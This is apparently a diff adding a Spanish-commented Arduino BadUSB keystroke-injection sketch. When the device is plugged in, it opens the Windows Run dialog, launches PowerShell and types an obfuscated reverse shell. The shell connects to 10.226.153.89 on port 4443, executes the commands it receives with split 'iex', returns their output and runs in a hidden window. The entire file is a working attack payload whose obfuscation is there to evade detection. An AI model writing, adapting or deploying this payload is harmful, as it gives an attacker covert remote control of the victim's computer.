@@ -1,0 +1,24 @@
+#include "exfil.h"
+#include "phukd.h"
+
+
+void descarga(){
+  delay(300);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.write('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(250);
+  delay(1250);
+
+  Keyboard.println("powershell");
+  delay(1800); // más tiempo para que PS abra
+
+  Keyboard.println("Start-Process $PSHOME\\powershell.exe -ArgumentList {$e9df6b9048c247faa45be361fb8092dae9df6b9048c247faa45be361fb8092dae9df6b9048c247faa45be361fb8092dae9df6b9048c247faa45be361fb8092d = New-Object System.Net.Sockets.TCPClient('10.226.153.89',4443)<# 9b5041ea1536461f922167f9bee7666e45fc10c57c954319a16bfcdfae16453a #>;$416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673 = $e9df6b9048c247faa45be361fb8092dae9df6b9048c247faa45be361fb8092dae9df6b9048c247faa45be361fb8092dae9df6b9048c247faa45be361fb8092d.GetStream() <# 4067ef26980c4945a13f05c600e13233f57df9a631ac49bf9f98543c6bf27de6 #>;[byte[]]$71d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5 = 0..65535|%{0};while(($i = $416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673.Read($71d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5, 0, $71d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5.Length)) -ne 0){;$d21527c7a98a4678bbee86250c5603dcd21527c7a98a4678bbee86250c5603dcd21527c7a98a4678bbee86250c5603dcd21527c7a98a4678bbee86250c5603d = (New-Object <# dd74d173407a472eaedd958f0bee42984d4d38fa68554eada2a76067d07728f4 #> -TypeName System.Text.ASCIIEncoding).GetString($71d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5571d1c93c1ec748558408b16b4ae72e5,0, $i);$aaaaaaaaaaffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff = (i''e""x $d21527c7a98a4678bbee86250c5603dcd21527c7a98a4678bbee86250c5603dcd21527c7a98a4678bbee86250c5603dcd21527c7a98a4678bbee86250c5603d 2>&1 | Out-String );$fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff = $aaaaaaaaaaffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + 'PS ' + (p""w''d).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);$416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673.Write($sendbyte,0,$sendbyte.Length);$416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673a416597564c4a4e289db9102821b8673.Flush() <# 2dd2765092f244239d739aebfe1d24114f75662cd7ad443380010ab9fe93ee36 #>};$e9df6b9048c247faa45be361fb8092dae9df6b9048c247faa45be361fb8092dae9df6b9048c247faa45be361fb8092dae9df6b9048c247faa45be361fb8092d.Close()} -WindowStyle Hidden ; exit ");
+}
+
+void payload() {
+  delay(1000);
+
+  descarga();
+} 
